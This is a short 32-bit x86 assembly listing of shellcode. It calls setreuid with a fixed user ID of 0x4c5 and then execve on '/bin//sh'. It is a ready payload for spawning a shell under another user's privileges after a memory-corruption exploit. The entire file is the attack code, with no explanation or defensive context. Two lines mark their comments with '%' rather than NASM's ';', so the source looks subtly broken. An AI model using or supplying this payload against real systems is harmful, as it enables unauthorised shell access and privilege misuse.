
bits 32
section .text
global _start

_start:

    push   0x46
    pop eax
    mov cx, 0x4c5 %ruid
    mov bx, 0x4c5 %euid
    int    0x80
    xor    edx,edx
    push   0xb
    pop    eax
    push   edx
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    push   edx
    push   ebx
    mov    ecx,esp
    int    0x80

